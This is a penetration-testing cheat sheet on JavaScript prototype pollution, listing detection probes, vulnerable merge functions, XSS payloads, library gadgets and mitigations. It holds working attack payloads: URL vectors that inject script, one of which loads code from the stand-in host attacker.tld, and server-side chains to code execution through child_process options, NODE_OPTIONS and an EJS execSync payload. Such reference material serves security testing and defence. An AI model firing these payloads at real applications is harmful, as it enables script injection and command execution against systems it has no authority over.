# Prototype Pollution

> Prototype Pollution exploits JavaScript's prototype chain. By polluting `Object.prototype`, an attacker influences the behavior of every object in the runtime.

## Summary

- [Detection](#detection)
- [Vulnerable Sinks](#vulnerable-sinks)
- [Client-Side Pollution](#client-side-pollution)
- [Server-Side Pollution → RCE](#server-side-pollution--rce)
- [DOM Clobbering Bonus](#dom-clobbering-bonus)
- [Mitigation](#mitigation)
- [References](#references)

## Detection

### Client-side

Open DevTools console:

```javascript
({}).polluted
// undefined  — clean
({}).polluted
// "yes"      — polluted
```

Test via URL:

```
?__proto__[polluted]=yes
?__proto__.polluted=yes
?constructor[prototype][polluted]=yes
?constructor.prototype.polluted=yes
```

### Server-side

```json
{"__proto__": {"polluted": "yes"}}
{"constructor": {"prototype": {"polluted": "yes"}}}
```

Then read back any object property to confirm.

## Vulnerable Sinks

Functions that historically (or still in some versions) merge objects unsafely:

- `Object.assign` (target controlled)
- `lodash.merge` / `_.set` / `_.defaultsDeep` (pre-fix versions)
- `jquery.extend(true, ...)`
- `hoek.applyToDefaults` (legacy Hapi)
- `mongoose.set('debug', ...)` (in old versions)
- Custom merge / deepmerge functions
- `qs` / `body-parser` with parsed `__proto__` keys (older versions)

## Client-Side Pollution

### Generic vectors

```
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
?__proto__[src]=//attacker.tld/x.js
?__proto__[onerror]=alert(1)
?__proto__[srcdoc]=<script>alert(1)</script>
?__proto__[action]=javascript:alert(1)
?__proto__[formaction]=javascript:alert(1)
?__proto__[autofocus]=
?__proto__[onload]=alert(1)
```

### Library gadgets (XSS via pollution)

| Library | Gadget |
|---------|--------|
| jQuery `$.fn.init` | `__proto__[type]=text/javascript&__proto__[src]=...` |
| Bootstrap modals | `__proto__[template]=<img src=x onerror=alert(1)>` |
| Vue 2 | `__proto__[v-bind]=...` |
| Lodash | `__proto__[template]=<%= alert(1) %>` |
| Marked | `__proto__[xhtml]=true` |

See [Client-Side Prototype Pollution Gadgets](https://github.com/BlackFan/client-side-prototype-pollution) for a curated list.

## Server-Side Pollution → RCE

### Classic Node `child_process.spawn` gadget

```json
{"__proto__":{"shell":"/bin/bash","argv0":"sh"}}
```

If app later runs `child_process.spawn('node', ['-e', code])`, the polluted `options` give the attacker control of the shell binary.

### `child_process.exec` env

```json
{"__proto__":{"env":{"NODE_OPTIONS":"--require /tmp/x.js"}}}
```

Now any spawned child loads attacker code.

### Express/EJS RCE chain

Polluting `__proto__.outputFunctionName` plus EJS:

```json
{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');var __tmp2"}}
```

### Common targets

- `NODE_OPTIONS`
- `outputFunctionName` (EJS, Pug)
- `polyfills` (Webpack)
- `cache.unsafe` (express-fileupload)

## DOM Clobbering Bonus

When prototype pollution alone isn't enough, DOM clobbering can supply additional sinks:

```html
<form id="config"><input name="endpoint" value="https://attacker.tld"></form>
```

→ Some code paths read `window.config.endpoint` and now get the attacker value.

## Mitigation

- Use `Object.create(null)` for data containers — no prototype to pollute.
- Use `Map` instead of plain objects for arbitrary keys.
- Use `Object.freeze(Object.prototype)` at app start (sledgehammer; breaks some libraries).
- Use safe merge libraries (`lodash` 4.17.21+, `deepmerge` with `clone:true`, custom merge that skips `__proto__` / `constructor` / `prototype`).
- Validate JSON inputs with strict schemas (Ajv with `additionalProperties:false`).
- For Node ≥ 22, use `--disable-proto=throw`.

## References

- [PortSwigger — Prototype Pollution](https://portswigger.net/web-security/prototype-pollution)
- [BlackFan — Client-side Prototype Pollution Gadgets](https://github.com/BlackFan/client-side-prototype-pollution)
- [HackTricks — Prototype Pollution](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution)
